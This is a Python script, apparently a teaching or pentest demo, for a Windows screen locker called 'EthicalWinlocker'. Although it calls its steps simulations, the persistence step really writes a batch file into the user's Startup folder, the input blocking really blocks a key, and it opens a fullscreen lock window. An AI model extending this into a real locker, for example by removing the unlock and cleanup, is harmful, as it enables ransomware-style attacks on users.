#! /usr/bin/env python
# -*- coding: utf-8 -*-
import getpass
import os
import ctypes
import subprocess
from tkinter import Tk, Label, Button

class EthicalWinlocker:
    def __init__(self):
        self.user_name = getpass.getuser()
        self.startup_path = fr"C:\Users\{self.user_name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

    def add_persistence(self, script_path):
        """Simulates adding a script to startup."""
        try:
            with open(self.startup_path + '\\open.bat', "w+") as bat_file:
                bat_file.write(f'start "" {script_path}')
            print("[+] Startup persistence simulated.")
        except Exception as e:
            print(f"[-] Error creating startup script: {e}")

    def remove_persistence(self):
        """Simulates removing persistence."""
        try:
            os.remove(self.startup_path + '\\open.bat')
            print("[+] Startup persistence removed.")
        except FileNotFoundError:
            print("[-] Startup script not found.")
        except Exception as e:
            print(f"[-] Error removing startup script: {e}")

    def lock_screen(self):
        """Simulates a lock screen."""
        root = Tk()
        root.title("Penetration Test: System Locked")
        root.attributes("-fullscreen", True)

        label = Label(root, text="System Locked - Penetration Testing", font=("Arial", 24), bg="red", fg="white")
        label.pack(expand=True)

        unlock_button = Button(root, text="Simulate Unlock", font=("Arial", 18), command=root.destroy)
        unlock_button.pack()

        root.mainloop()

    def log_attempts(self, file_name="attempts.log"):
        """Logs simulated unauthorized access attempts."""
        try:
            with open(file_name, "a") as log_file:
                log_file.write("Unauthorized access attempt detected\n")
            print("[+] Unauthorized attempt logged.")
        except Exception as e:
            print(f"[-] Error logging attempts: {e}")

    def simulate_attack(self, input_block=False):
        """Simulates an input blocking or data exfiltration test."""
        print("[+] Simulating input blocking or attack mechanism.")
        if input_block:
            try:
                import keyboard
                keyboard.block_key('a')  # Block key 'a' as an example
                print("[+] Key 'a' blocked successfully.")
            except ImportError:
                print("[-] Install `keyboard` library to simulate input blocking.")

    def cleanup(self):
        """Simulates cleanup actions after a test."""
        self.remove_persistence()
        print("[+] Cleanup complete.")

if __name__ == "__main__":
    winlocker = EthicalWinlocker()

    # Simulate startup persistence
    script_path = os.path.abspath(__file__)
    winlocker.add_persistence(script_path)

    # Simulate a lock screen
    winlocker.lock_screen()

    # Simulate logging unauthorized attempts
    winlocker.log_attempts()

    # Simulate an attack (e.g., input blocking)
    winlocker.simulate_attack(input_block=True)

    # Perform cleanup
    winlocker.cleanup()